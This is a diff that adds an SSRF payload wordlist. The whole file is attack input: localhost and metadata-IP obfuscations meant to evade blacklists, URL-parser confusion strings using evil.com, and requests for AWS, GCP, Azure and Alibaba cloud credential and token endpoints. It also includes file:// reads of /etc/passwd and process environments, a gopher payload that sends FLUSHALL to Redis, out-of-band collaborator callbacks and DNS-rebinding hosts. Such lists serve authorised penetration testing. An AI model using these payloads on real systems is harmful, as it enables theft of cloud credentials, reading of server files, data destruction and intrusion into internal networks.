@@ -1,0 +1,125 @@
+# SSRF payloads — cloud metadata, localhost variants, URL parser confusion, blind
+
+# --- Localhost basics ---
+http://localhost
+http://127.0.0.1
+http://127.0.0.1:80
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:5432
+http://127.0.0.1:6379
+http://127.0.0.1:9200
+http://127.0.0.1:27017
+http://0.0.0.0
+http://[::1]
+http://[::]:80
+
+# --- Localhost obfuscation (bypass naive blacklists) ---
+http://127.1
+http://127.0.1
+http://2130706433/
+http://0x7f.0x0.0x0.0x1
+http://0x7f000001/
+http://017700000001
+http://127.0.0.1.nip.io
+http://127.0.0.1.xip.io
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://①②⑦.⓪.⓪.①
+
+# --- URL parser confusion ---
+http://evil.com#@127.0.0.1/
+http://evil.com@127.0.0.1/
+http://127.0.0.1:80@evil.com/
+http://evil.com:80+&@127.0.0.1:80/
+http://127.0.0.1\@evil.com
+http://127.0.0.1:25/\@evil.com:80/
+http://127.0.0.1#evil.com
+http://127.0.0.1/?url=http://evil.com
+http://127.0.0.1.evil.com
+http://evil.com.127.0.0.1.nip.io
+
+# --- AWS metadata (IMDSv1 and v2 request shape) ---
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/latest/api/token
+http://[fd00:ec2::254]/latest/meta-data/
+http://instance-data/latest/meta-data/
+# Obfuscated IMDS
+http://2852039166/latest/meta-data/
+http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/
+http://169.254.169.254.nip.io/latest/meta-data/
+http://169.254.169.254%40evil.com/latest/meta-data/
+
+# --- Google Cloud metadata ---
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+
+# --- Azure metadata ---
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# --- DigitalOcean metadata ---
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/user-data
+
+# --- Alibaba Cloud metadata ---
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/
+
+# --- Oracle Cloud metadata ---
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/user-data/
+
+# --- Kubernetes / Docker ---
+http://kubernetes.default.svc.cluster.local
+http://kubernetes.default.svc
+https://kubernetes.default/api/v1/namespaces
+http://host.docker.internal
+http://host.docker.internal:80
+
+# --- Non-HTTP protocols (sometimes parsers forward) ---
+file:///etc/passwd
+file:///etc/hostname
+file:///proc/self/environ
+file:///proc/net/tcp
+file:///c:/windows/win.ini
+gopher://127.0.0.1:6379/_FLUSHALL
+gopher://127.0.0.1:25/_HELO
+dict://127.0.0.1:22/info
+dict://127.0.0.1:6379/info
+ftp://127.0.0.1:22
+ldap://127.0.0.1
+tftp://127.0.0.1
+sftp://127.0.0.1/
+jar:http://127.0.0.1:80!/
+netdoc://127.0.0.1/
+
+# --- Private ranges (RFC 1918) ---
+http://10.0.0.1
+http://10.0.0.0
+http://10.255.255.255
+http://172.16.0.1
+http://172.31.255.255
+http://192.168.0.1
+http://192.168.1.1
+http://192.168.1.254
+
+# --- Link-local ---
+http://169.254.1.1
+http://169.254.100.100
+
+# --- Blind SSRF OOB (needs collaborator) ---
+http://YOURCOLLAB.interact.sh/
+http://YOURCOLLAB.burpcollaborator.net/
+https://webhook.site/YOUR-UUID
+
+# --- URL redirect via Location header (DNS rebinding) ---
+http://rebind.attacker.com/
+http://tester.attacker.com.1time.127.0.0.1.nip.io/
